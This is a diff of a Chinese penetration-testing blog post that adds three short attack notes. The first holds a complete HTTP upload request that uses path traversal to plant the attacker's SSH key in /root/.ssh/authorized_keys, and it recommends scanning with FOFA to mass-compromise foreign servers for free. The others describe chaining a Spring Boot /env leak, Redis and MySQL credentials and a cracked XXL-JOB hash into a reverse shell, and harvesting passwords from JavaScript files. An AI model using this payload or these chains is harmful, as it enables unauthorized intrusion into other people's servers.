@@ -31,19 +31,23 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="日常1   上传文件出任意写文件+ssh免密登录成功复现了一个漏洞，往目标主机里写ssh免密登录 poc如下： 1  但是想要扒拉东西的话，这样很慢，上winscp免密登录比较好一些 日常2  springboot信息泄露+redis未授权+XXL-JOB反弹shell32位的弱口令泄露 爱来自&#x2F;env目录  登上去后搜到了 日常3  无论何时放弃都不是最好的选择，坚持才是">
+  <meta name="description" content="一想到还得专门写好几篇就头大犯懒，所以改成写个小集合，最近忙东忙西博客更新停滞了，以后会提上来的。 日常1   上传文件处可指定任意目录+ssh免密登录成功复现了一个漏洞，往目标主机里写ssh免密登录 先生成密钥文件 12ssh-keygen -t rsa cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub    #可以拿来用啦  poc如下： 12345678910111213141516171">
 <meta property="og:type" content="article">
-<meta property="og:title" content="杂七杂八的学习与实战日常×3（施工中）">
+<meta property="og:title" content="杂七杂八的学习与实战日常×3">
 <meta property="og:url" content="http://example.com/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/index.html">
 <meta property="og:site_name" content="各种write up">
-<meta property="og:description" content="日常1   上传文件出任意写文件+ssh免密登录成功复现了一个漏洞，往目标主机里写ssh免密登录 poc如下： 1  但是想要扒拉东西的话，这样很慢，上winscp免密登录比较好一些 日常2  springboot信息泄露+redis未授权+XXL-JOB反弹shell32位的弱口令泄露 爱来自&#x2F;env目录  登上去后搜到了 日常3  无论何时放弃都不是最好的选择，坚持才是">
+<meta property="og:description" content="一想到还得专门写好几篇就头大犯懒，所以改成写个小集合，最近忙东忙西博客更新停滞了，以后会提上来的。 日常1   上传文件处可指定任意目录+ssh免密登录成功复现了一个漏洞，往目标主机里写ssh免密登录 先生成密钥文件 12ssh-keygen -t rsa cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub    #可以拿来用啦  poc如下： 12345678910111213141516171">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/1.png">
+<meta property="og:image" content="http://example.com/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/2.png">
+<meta property="og:image" content="http://example.com/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/3.png">
+<meta property="og:image" content="http://example.com/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/4.png">
 <meta property="article:published_time" content="2023-08-02T06:14:27.000Z">
-<meta property="article:modified_time" content="2023-08-21T06:16:12.157Z">
+<meta property="article:modified_time" content="2023-09-13T01:59:30.897Z">
 <meta property="article:author" content="Reigniting">
 <meta property="article:tag" content="渗透笔记">
-<meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/1.png">
 
 <link rel="canonical" href="http://example.com/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/">
 
@@ -58,7 +62,7 @@
   };
 </script>
 
-  <title>杂七杂八的学习与实战日常×3（施工中） | 各种write up</title>
+  <title>杂七杂八的学习与实战日常×3 | 各种write up</title>
   
 
 
@@ -219,7 +223,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          杂七杂八的学习与实战日常×3（施工中）
+          杂七杂八的学习与实战日常×3
         </h1>
 
         <div class="post-meta">
@@ -236,7 +240,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-08-21 14:16:12" itemprop="dateModified" datetime="2023-08-21T14:16:12+08:00">2023-08-21</time>
+                <time title="修改时间：2023-09-13 09:59:30" itemprop="dateModified" datetime="2023-09-13T09:59:30+08:00">2023-09-13</time>
               </span>
 
           
@@ -252,14 +256,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>172</span>
+              <span>1.7k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>2 分钟</span>
             </span>
 
         </div>
@@ -271,14 +275,38 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="日常1-上传文件出任意写文件-ssh免密登录"><a href="#日常1-上传文件出任意写文件-ssh免密登录" class="headerlink" title="日常1   上传文件出任意写文件+ssh免密登录"></a>日常1   上传文件出任意写文件+ssh免密登录</h2><p>成功复现了一个漏洞，往目标主机里写ssh免密登录</p>
+        <p>一想到还得专门写好几篇就头大犯懒，所以改成写个小集合，最近忙东忙西博客更新停滞了，以后会提上来的。</p>
+<h2 id="日常1-上传文件处可指定任意目录-ssh免密登录"><a href="#日常1-上传文件处可指定任意目录-ssh免密登录" class="headerlink" title="日常1   上传文件处可指定任意目录+ssh免密登录"></a>日常1   上传文件处可指定任意目录+ssh免密登录</h2><p>成功复现了一个漏洞，往目标主机里写ssh免密登录</p>
+<p>先生成密钥文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa </span><br><span class="line">cat /root/.ssh/id_rsa.pub    #可以拿来用啦</span><br></pre></td></tr></table></figure>
+
 <p>poc如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /upload/UploadServlet HTTP/1.1</span><br><span class="line">Content-Length: 1283</span><br><span class="line">Content-Type: multipart/form-data; boundary=8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Host: 码码码码码码码码码码码码码码</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">--8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Content-Disposition: form-data; name=&quot;access_token&quot;</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">5d64e94b10e14025a234c4f6870c38e0</span><br><span class="line">--8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Content-Disposition: form-data; name=&quot;validTime&quot;</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">1.0</span><br><span class="line">--8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Content-Disposition: form-data; name=&quot;userId&quot;</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">10002341</span><br><span class="line">--8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;../../../../../../../../../../../../../../../../../../../root/.ssh/authorized_keys&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Transfer-Encoding: binary</span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC此处是自己这边生成的密钥文件，上传这个authorized_keys可轻松实现免密登录LbGM= root@kali</span><br></pre></td></tr></table></figure>
 
 <p>但是想要扒拉东西的话，这样很慢，上winscp免密登录比较好一些</p>
+<p>搭配fofa指纹批量，目标只要对准国外主机，分分钟拥有一堆国外的公网服务器</p>
+<p>你的下一台主机，何必花钱是买来的？（狗头保命）</p>
+<p>这个是有一定概率不成功的，比如根本没这个目录、比如根本没开这个端口、比如权限问题等等</p>
+<p>大部分还是能成的</p>
 <h2 id="日常2-springboot信息泄露-redis未授权-XXL-JOB反弹shell"><a href="#日常2-springboot信息泄露-redis未授权-XXL-JOB反弹shell" class="headerlink" title="日常2  springboot信息泄露+redis未授权+XXL-JOB反弹shell"></a>日常2  springboot信息泄露+redis未授权+XXL-JOB反弹shell</h2><p>32位的弱口令泄露 爱来自/env目录 </p>
-<p>登上去后搜到了</p>
-<h2 id="日常3"><a href="#日常3" class="headerlink" title="日常3"></a>日常3</h2><hr>
+<p>登上去后搜到了Redis和MySQL数据库密码</p>
+<p><img src="/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/1.png"></p>
+<p>32位，看起来很复杂，对8？在复杂他也是弱口令</p>
+<p>搭配扫描工具还发现个XXL-JOB系统  密码不是admin 123456这种的，那就先不管</p>
+<p>连上两个数据库，发现其中一个存的有这个XXL-JOB的账号信息</p>
+<p><img src="/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/2.png"></p>
+<p>md5解开来是111111  反正这个也不需要验证码也没有次数限制，爆破也是可以的，只不过爆破实属下下策，不建议考虑</p>
+<p>后续就是已知公开的漏洞，计划任务公网弹shell</p>
+<p>在后面，你懂得（狗头保命）</p>
+<h2 id="日常3-为啥密码直接在js文件里能搜到啊？"><a href="#日常3-为啥密码直接在js文件里能搜到啊？" class="headerlink" title="日常3   为啥密码直接在js文件里能搜到啊？"></a>日常3   为啥密码直接在js文件里能搜到啊？</h2><p>我不理解 打开js文件搜一下password 用户名和密码全给出来了</p>
+<p>比如这样↓↓↓</p>
+<p><img src="/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/3.png"></p>
+<p>还有这种好事？还真有这种好事…… </p>
+<p><img src="/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/4.png"></p>
+<p>好事，好事，好事啊</p>
+<p>遇见一回两回就算了，遇见太多回了所以单独拎出来写一下，也许这是一处非凡的突破口。</p>
+<p>每个人渗透习惯不同，有的人可能就发现不了，反正我是会偶尔扒拉一下js文件的。</p>
+<hr>
 <blockquote>
 <p>无论何时放弃都不是最好的选择，坚持才是</p>
 </blockquote>
@@ -302,7 +330,6 @@
       <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i> 渗透笔记</a>
-              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 内网渗透</a>
           </div>
 
         
@@ -373,7 +400,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A5%E5%B8%B81-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%87%BA%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6-ssh%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">日常1   上传文件出任意写文件+ssh免密登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A5%E5%B8%B82-springboot%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-redis%E6%9C%AA%E6%8E%88%E6%9D%83-XXL-JOB%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.</span> <span class="nav-text">日常2  springboot信息泄露+redis未授权+XXL-JOB反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A5%E5%B8%B83"><span class="nav-number">3.</span> <span class="nav-text">日常3</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A5%E5%B8%B81-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%A4%84%E5%8F%AF%E6%8C%87%E5%AE%9A%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95-ssh%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">日常1   上传文件处可指定任意目录+ssh免密登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A5%E5%B8%B82-springboot%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-redis%E6%9C%AA%E6%8E%88%E6%9D%83-XXL-JOB%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.</span> <span class="nav-text">日常2  springboot信息泄露+redis未授权+XXL-JOB反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A5%E5%B8%B83-%E4%B8%BA%E5%95%A5%E5%AF%86%E7%A0%81%E7%9B%B4%E6%8E%A5%E5%9C%A8js%E6%96%87%E4%BB%B6%E9%87%8C%E8%83%BD%E6%90%9C%E5%88%B0%E5%95%8A%EF%BC%9F"><span class="nav-number">3.</span> <span class="nav-text">日常3   为啥密码直接在js文件里能搜到啊？</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -437,12 +464,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">59k</span>
+    <span title="站点总字数">61k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">54 分钟</span>
+    <span title="站点阅读时长">55 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
